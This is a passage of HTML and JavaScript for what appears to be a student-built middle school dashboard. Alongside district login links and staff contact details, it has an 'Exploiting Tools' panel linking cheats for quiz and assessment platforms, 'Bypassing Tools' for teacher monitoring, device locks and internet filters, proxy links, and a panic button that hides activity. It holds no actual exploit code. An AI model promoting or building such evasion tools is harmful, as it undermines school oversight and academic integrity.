          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons grid-container-4">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
          <a href="https://example.com/exploit/desmos" target="_blank">Desmos Exploit (New)</a>
          <a href="https://example.com/exploit/codehs" target="_blank">CodeHS Exploit (New)</a>
          <a href="https://example.com/exploit/apex" target="_blank">APEX Exploit (New)</a>
          <a href="https://example.com/exploit/nwea" target="_blank">NWEA Exploit (New)</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons grid-container-3">
          <button onclick="dashboard.showBypassContent('bathroom', this)">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi', this)">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring', this)">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('deviceLock', this)">Device Lock Bypass (New)</button>
          <button onclick="dashboard.showBypassContent('internetFilter', this)">Internet Filter Bypass (New)</button>
          <button onclick="dashboard.showBypassContent('appBlocker', this)">App Blocker Bypass (New)</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON: Tips and tricks for bathroom pass navigation and timing strategies.</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information to find guest network details, or consider VPNs.</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON: Techniques to avoid or mitigate teacher monitoring software (simulated).</p>
        </div>

        <div id="deviceLockBypass" class="bypass-content">
            <p>COMING SOON: Information on how to temporarily or permanently disable device locking features.</p>
        </div>
        
        <div id="internetFilterBypass" class="bypass-content">
            <p>Utilize a reliable VPN, or explore proxy websites (available in VPN/Proxy panels) to bypass internet filters. Always browse responsibly.</p>
        </div>
        
        <div id="appBlockerBypass" class="bypass-content">
            <p>COMING SOON: Methods for circumventing common application blocking mechanisms on school devices.</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites & Proxies</h2>
        <div class="links-list grid-container-2">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1 (FastVPN)</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2 (SecureNet)</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3 (FreeTunnel)</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4 (StealthVPN)</a>
          <a href="https://www.proxysite.com/" target="_blank">ProxySite.com (New)</a>
          <a href="https://hide.me/proxy" target="_blank">Hide.me Proxy (New)</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites & Unblocked Games</h2>
        <div class="coming-soon">
            GAMING HUB COMING SOON - Expected in v1.7.0!
        </div>
        <div class="links-list grid-container-2" style="margin-top: 20px;">
            <a href="https://scratch.mit.edu/explore/games" target="_blank">Scratch Games</a>
            <a href="https://www.retrogames.cc/" target="_blank">RetroGames.cc</a>
            <a href="https://poki.com/" target="_blank">Poki.com</a>
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music & Audio Websites</h2>
        <div class="coming-soon">
          MUSIC PLAYER & RESOURCE LIBRARY COMING SOON!
        </div>
        <div class="links-list grid-container-2" style="margin-top: 20px;">
            <a href="https://www.spotify.com/web-player/" target="_blank">Spotify Web Player</a>
            <a href="https://soundcloud.com/" target="_blank">SoundCloud</a>
            <a href="https://music.youtube.com/" target="_blank">YouTube Music</a>
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks & System Shortcuts</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>
    </div> <!-- End infoPanelsContainer -->

    <!-- Notes Canvas (toggle visibility, moved out of dashboard object) -->
    <div id="canvasContainer" style="display: none;">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn" onclick="dashboard.notify('Notes canvas cleared.', 'info')">Clear Canvas</button>
        <button id="closeCanvasBtn" onclick="dashboard.notify('Notes canvas closed.', 'info')">Close Notes</button>
      </div>
    </div>
  </div> <!-- End dashboard -->

  <!-- Notification Area -->
  <div id="notificationArea"></div>

  <script>
    // Global utility to prevent repeated event listener binding and simplify cleanup
    const eventManager = {
        listeners: [],
        addListener: function(element, event, handler) {
            if (element) {
                element.addEventListener(event, handler);
                this.listeners.push({ element, event, handler });
            }
        },
        removeListeners: function() {
            this.listeners.forEach(({ element, event, handler }) => {
                if (element) element.removeEventListener(event, handler);
            });
            this.listeners = [];
        }
    };

    // Dashboard functionality object
    const dashboard = {
      activePanelId: null, // Track currently active info panel for toggling and notification
      notifications: [], // Store notifications
      reminders: [], // Store reminders
      currentTimer: null,
      timerSecondsLeft: 0,
      stopwatchInterval: null,
      stopwatchSeconds: 0,
      
      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClockAndDate();
        this.generateCalendar();
        this.initThemeToggle();
        this.initCoreButtons();
        this.initCanvasDrawing(); // Renamed from initCanvas for clarity
        this.initInfoPanels(); // New function for managing general info panels
        this.loadSettings(); // Load user settings
        this.loadReminders(); // Load saved reminders
        this.renderReminders(); // Display loaded reminders
        this.checkOverdueReminders();
        this.setupGeneralEventListeners(); // New function for other non-specific button clicks
        this.initSpecificPanelLogics(); // Initialize logic for new panels
        this.initDigitalClock();
      },

      // --- New Global Functions ---

      // Display a notification
      notify: function(message, type = 'info', duration = 5000) {
        if (!document.getElementById('settingNotificationsEnabled') || document.getElementById('settingNotificationsEnabled').checked) {
            const notificationArea = document.getElementById('notificationArea');
            const notificationEl = document.createElement('div');
            notificationEl.className = `notification ${type}`;
            notificationEl.innerHTML = `<span>${message}</span>`;
            notificationArea.appendChild(notificationEl);
            
            // For log panel
            this.notifications.push({ timestamp: new Date().toLocaleString(), message, type });
            this.renderNotificationLog();

            // Auto-fade out for standard notifications
            if (duration > 0) {
                setTimeout(() => {
                    notificationEl.style.opacity = '0';
                    notificationEl.style.transform = 'translateX(100%)';
                    setTimeout(() => notificationEl.remove(), 600); // Wait for transition
                }, duration);
            }
        }
      },

      // Test notification function for settings
      testNotification: function() {
        this.notify('This is a test notification from settings!', 'success');
      },

      // Clear notifications from the display area and log
      clearNotifications: function() {
          const notificationArea = document.getElementById('notificationArea');
          notificationArea.innerHTML = '';
          this.notifications = []; // Clear the log data
          this.renderNotificationLog();
          this.notify('Notification log cleared.', 'info');
      },
      
      // Render notification log panel
      renderNotificationLog: function() {
          const logPanel = document.getElementById('notificationLog');
          if (!logPanel) return;

          logPanel.innerHTML = ''; // Clear existing
          if (this.notifications.length === 0) {
              logPanel.innerHTML = '<p style="text-align: center; color: gray;">No notifications yet.</p>';
              return;
          }

          // Render in reverse chronological order
          this.notifications.slice().reverse().forEach(notif => {
              const notifEntry = document.createElement('div');
              notifEntry.className = `update-entry notification-log-entry ${notif.type}`; // Reuse update-entry style
              notifEntry.innerHTML = `<strong>[${notif.timestamp}]</strong> ${notif.message}`;
              logPanel.appendChild(notifEntry);
          });
      },


      // --- Core Dashboard Initializations ---

      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        const updateSessionTime = () => {
          sessionSeconds++;
          const sessionTimeEl = document.getElementById('sessionTime');
          if (sessionTimeEl) sessionTimeEl.innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        };
        setInterval(updateSessionTime, 1000);
      },
      
      initClockAndDate: function() {
        const updateClock = () => {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          const realTimeClockEl = document.getElementById('realTimeClock');
          if (realTimeClockEl) realTimeClockEl.innerText = '🕒 ' + timeStr;
          const realDateEl = document.getElementById('realDate');
          if (realDateEl) realDateEl.innerText = '📅 ' + dateStr;
        };
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return;

        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (themeBtn) {
            eventManager.addListener(themeBtn, 'click', (event) => {
                document.body.classList.toggle('light-theme');
                if(document.body.classList.contains('light-theme')){
                    themeBtn.innerText = '☀️ Light Mode';
                    document.getElementById('settingThemeToggle').checked = true;
                    this.notify('Switched to Light Mode', 'info');
                } else {
                    themeBtn.innerText = '🌙 Dark Mode';
                    document.getElementById('settingThemeToggle').checked = false;
                    this.notify('Switched to Dark Mode', 'info');
                }
                this.saveSettings(); // Save theme preference
                this.updateAccentColorVars(); // Update CSS vars immediately
                this.logButtonPress(event.target);
            });
        }
        
        // Link with settings panel toggle
        const settingThemeToggle = document.getElementById('settingThemeToggle');
        if (settingThemeToggle) {
            eventManager.addListener(settingThemeToggle, 'change', () => {
                if (settingThemeToggle.checked) {
                    document.body.classList.add('light-theme');
                    if (themeBtn) themeBtn.innerText = '☀️ Light Mode';
                    this.notify('Switched to Light Mode', 'info');
                } else {
                    document.body.classList.remove('light-theme');
                    if (themeBtn) themeBtn.innerText = '🌙 Dark Mode';
                    this.notify('Switched to Dark Mode', 'info');
                }
                this.saveSettings();
                this.updateAccentColorVars();
            });
        }
      },
      
      initCoreButtons: function() {
        // Panic Button
        eventManager.addListener(document.getElementById('panicBtn'), 'click', (event) => {
            window.open('https://clever.com', '_blank');
            this.notify('Panic Button activated!', 'warning');
            this.logButtonPress(event.target);
        });

        // Restart Button
        eventManager.addListener(document.getElementById('restartBtn'), 'click', (event) => {
          if(confirm('Are you sure you want to kill the page (restart)? This will erase unsaved work!')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Close this tab and reopen for a fresh start.</div>`;
            this.notify('Dashboard Restarted (killed current view).', 'error');
            this.logButtonPress(event.target);
          }
        });

        // Fix Issues Button
        eventManager.addListener(document.getElementById('fixIssuesBtn'), 'click', (event) => {
          alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          this.notify('Diagnostics run: No issues found.', 'success');
          this.logButtonPress(event.target);
        });
        
        // Full Screen Button
        eventManager.addListener(document.getElementById('fullScreenBtn'), 'click', (event) => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
              this.notify(`Full screen failed: ${err.message}`, 'error');
            });
            this.notify('Entered Full Screen mode.', 'info');
          } else {
            document.exitFullscreen();
            this.notify('Exited Full Screen mode.', 'info');
          }
          this.logButtonPress(event.target);
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        // Zoom In Button
        eventManager.addListener(document.getElementById('zoomInBtn'), 'click', (event) => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
            this.notify(`Zoomed in: ${Math.round(zoomLevel * 100)}%`, 'info');
          } else {
            this.notify('Maximum zoom level reached.', 'warning');
          }
          this.logButtonPress(event.target);
        });

        // Zoom Out Button
        eventManager.addListener(document.getElementById('zoomOutBtn'), 'click', (event) => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
            this.notify(`Zoomed out: ${Math.round(zoomLevel * 100)}%`, 'info');
          } else {
            this.notify('Minimum zoom level reached.', 'warning');
          }
          this.logButtonPress(event.target);
        });

        // Logout Button
        eventManager.addListener(document.getElementById('logoutBtn'), 'click', (event) => {
            if (confirm('Are you sure you want to log out?')) {
                // For a simple refresh-based logout:
                location.reload(); 
                this.notify('Logged out successfully.', 'info');
            }
            this.logButtonPress(event.target);
        });
      },
      
      // Separate canvas drawing logic for clarity
      initCanvasDrawing: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGridContainer = document.getElementById('mainGrid');
        const updateNotificationSection = document.getElementById('updatesNotifications'); // New

        if (!notesBtn || !canvasContainer || !mainGridContainer) return;

        eventManager.addListener(notesBtn, 'click', (event) => {
          mainGridContainer.style.display = 'none';
          updateNotificationSection.style.display = 'none'; // Also hide updates/notifications
          canvasContainer.style.display = 'block';
          this.notify('Notes canvas opened.', 'info');
          this.logButtonPress(event.target);
        });

        eventManager.addListener(document.getElementById('closeCanvasBtn'), 'click', () => {
          canvasContainer.style.display = 'none';
          mainGridContainer.style.display = 'flex';
          updateNotificationSection.style.display = 'flex'; // Show updates/notifications again
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const clientX = evt.touches ? evt.touches[0].clientX : evt.clientX;
          const clientY = evt.touches ? evt.touches[0].clientY : evt.clientY;
          return {
            x: clientX - rect.left,
            y: clientY - rect.top
          };
        }

        const startDrawing = (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        };

        const draw = (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = getComputedStyle(document.body).getPropertyValue('--dark-accent-primary'); // Use accent color
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        };

        const stopDrawing = () => { drawing = false; };

        eventManager.addListener(canvas, 'mousedown', startDrawing);
        eventManager.addListener(canvas, 'touchstart', startDrawing);
        eventManager.addListener(canvas, 'mousemove', draw);
        eventManager.addListener(canvas, 'touchmove', draw);
        eventManager.addListener(canvas, 'mouseup', stopDrawing);
        eventManager.addListener(canvas, 'mouseleave', stopDrawing);
        eventManager.addListener(canvas, 'touchend', stopDrawing);
        eventManager.addListener(canvas, 'touchcancel', stopDrawing);

        eventManager.addListener(clearCanvasBtn, 'click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        });

        // Screenshot functionality (covers entire dashboard, not just canvas)
        eventManager.addListener(document.getElementById('screenshotBtn'), 'click', (event) => {
            const elementToCapture = document.body;
            html2canvas(elementToCapture, { allowTaint: true, useCORS: true }).then(canvasImg => {
                const link = document.createElement('a');
                link.download = 'dashboard_screenshot.png';
                link.href = canvasImg.toDataURL('image/png');
                link.click();
                this.notify('Screenshot captured!', 'success');
                this.logButtonPress(event.target);
            });
        });
        
        // Export Notes (specific to canvas content)
        eventManager.addListener(document.getElementById('exportNotesBtn'), 'click', (event) => {
            const link = document.createElement('a');
            link.download = 'notes_canvas.png';
            link.href = canvas.toDataURL('image/png');
            link.click();
            this.notify('Notes canvas exported!', 'success');
            this.logButtonPress(event.target);
        });

        // Toggle Main Grid Sections
        const toggleBtn = document.getElementById('toggleSectionsBtn');
        eventManager.addListener(toggleBtn, 'click', (event) => {
          if (mainGridContainer.style.display === 'none') {
            mainGridContainer.style.display = 'flex';
            updateNotificationSection.style.display = 'flex';
            toggleBtn.innerText = '⬆️ Toggle Main Grid';
            this.notify('Main Grid sections shown.', 'info');
          } else {
            mainGridContainer.style.display = 'none';
            updateNotificationSection.style.display = 'none';
            toggleBtn.innerText = '⬇️ Toggle Main Grid';
            this.notify('Main Grid sections hidden.', 'info');
          }
          this.logButtonPress(event.target);
        });
      },
      
      // Initialize display states of all info panels
      initInfoPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
          content.classList.remove('active'); // Ensure no active class remains
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
          content.classList.remove('active');
        });
        
        // Set up main top-level buttons for panels
        eventManager.addListener(document.getElementById('settingsBtn'), 'click', () => {
            dashboard.togglePanel('settingsPanel', document.getElementById('settingsBtn'));
        });
        eventManager.addListener(document.getElementById('remindersBtn'), 'click', () => {
            dashboard.togglePanel('remindersPanel', document.getElementById('remindersBtn'));
        });
        eventManager.addListener(document.getElementById('helpGuideBtn'), 'click', () => {
            dashboard.togglePanel('helpGuidePanel', document.getElementById('helpGuideBtn'));
        });
        eventManager.addListener(document.getElementById('systemStatusBtn'), 'click', () => {
            dashboard.togglePanel('systemStatusPanel', document.getElementById('systemStatusBtn'));
        });
        eventManager.addListener(document.getElementById('networkToolsBtn'), 'click', () => {
            dashboard.togglePanel('networkToolsPanel', document.getElementById('networkToolsBtn'));
        });
        eventManager.addListener(document.getElementById('aboutPanelBtn'), 'click', () => {
            dashboard.togglePanel('aboutPanel', document.getElementById('aboutPanelBtn'));
        });
        eventManager.addListener(document.getElementById('notificationLogBtn'), 'click', () => {
            dashboard.togglePanel('notificationLogPanel', document.getElementById('notificationLogBtn'));
        });

      },

      // Generic function to log button presses
      logButtonPress: function(buttonElement) {
        if (buttonElement && buttonElement.innerText) {
            let buttonText = buttonElement.innerText.split(' ')[0].trim(); // Get first word/emoji
            if (buttonElement.id === 'sessionTime') buttonText = 'Session Time';
            if (buttonElement.id === 'realTimeClock') buttonText = 'Real Time Clock';
            if (buttonElement.id === 'realDate') buttonText = 'Real Date';

            const originalButtonText = buttonElement.textContent.trim();
            this.notify(`Button pressed: "${originalButtonText}"`, 'info', 3000); // Shorter duration for quick log
        }
      },
      
      // Panel toggle function
      togglePanel: function(panelId, buttonElement) {
        if (buttonElement) {
            this.logButtonPress(buttonElement);
        }

        const panel = document.getElementById(panelId);
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');

        if (!panel || !infoPanelsContainer) {
            console.error(`Panel ${panelId} or infoPanelsContainer not found.`);
            return;
        }

        if (this.activePanelId === panelId) {
            // Close the current active panel
            panel.style.display = 'none';
            this.activePanelId = null;
            infoPanelsContainer.style.display = 'none'; // Hide the container if no panel is open
            this.notify(`Panel "${panelId.replace('Panel', '')}" closed.`, 'info');
        } else {
            // Close any currently open panel
            if (this.activePanelId) {
                const activePanel = document.getElementById(this.activePanelId);
                if (activePanel) {
                    activePanel.style.display = 'none';
                    activePanel.querySelectorAll('.ipad-content, .bypass-content').forEach(content => content.classList.remove('active'));
                }
            }
            // Open the new panel
            panel.style.display = 'block';
            this.activePanelId = panelId;
            infoPanelsContainer.style.display = 'block'; // Show the container when a panel is open
            this.notify(`Panel "${panelId.replace('Panel', '')}" opened.`, 'info');
            
            // Re-apply any special active states if necessary (e.g., first tab for iPad panel)
            if (panelId === 'ipadPanel') {
                dashboard.showIpadContent('restrictions', null); // Automatically show default tab
            } else if (panelId === 'bypassPanel') {
                 dashboard.showBypassContent('bathroom', null); // Automatically show default tab
            }
        }
      },
      
      showIpadContent: function(contentId, buttonElement) {
        document.querySelectorAll('#ipadPanel .ipad-content').forEach(content => {
          content.classList.remove('active');
          content.style.display = 'none';
        });
        const targetContent = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
        if (targetContent) {
            targetContent.style.display = 'block';
            targetContent.classList.add('active');
            this.notify(`iPad content tab "${contentId}" shown.`, 'info', 2000);
            if(buttonElement) this.logButtonPress(buttonElement);
        }
      },
      
      showBypassContent: function(contentId, buttonElement) {
        document.querySelectorAll('#bypassPanel .bypass-content').forEach(content => {
          content.classList.remove('active');
          content.style.display = 'none';
        });
        const targetContent = document.getElementById(contentId + 'Bypass');
        if (targetContent) {
            targetContent.style.display = 'block';
            targetContent.classList.add('active');
            this.notify(`Bypass content tab "${contentId}" shown.`, 'info', 2000);
            if(buttonElement) this.logButtonPress(buttonElement);
        }
      },

      setupGeneralEventListeners: function() {
        // Find all buttons inside quick-bar and top-panel-buttons and add a listener to log
        const buttonsToLog = document.querySelectorAll('.quick-bar button, .top-panel-buttons button');
        buttonsToLog.forEach(button => {
            // Exclude buttons handled by togglePanel or with existing complex handlers
            if (!button.id.startsWith('notesBtn') && !button.id.startsWith('exportNotesBtn') &&
                !button.id.startsWith('screenshotBtn') && !button.id.startsWith('toggleSectionsBtn') &&
                !button.id.startsWith('fixIssuesBtn') && !button.id.startsWith('fullScreenBtn') &&
                !button.id.startsWith('zoomInBtn') && !button.id.startsWith('zoomOutBtn') &&
                !button.id.startsWith('restartBtn') && !button.id.startsWith('panicBtn') &&
                !button.id.startsWith('themeToggle') && !button.id.startsWith('logoutBtn') &&
                !button.id.startsWith('settingsBtn') && !button.id.startsWith('remindersBtn') &&
                !button.id.startsWith('helpGuideBtn') && !button.id.startsWith('systemStatusBtn') &&
                !button.id.startsWith('networkToolsBtn') && !button.id.startsWith('aboutPanelBtn') &&
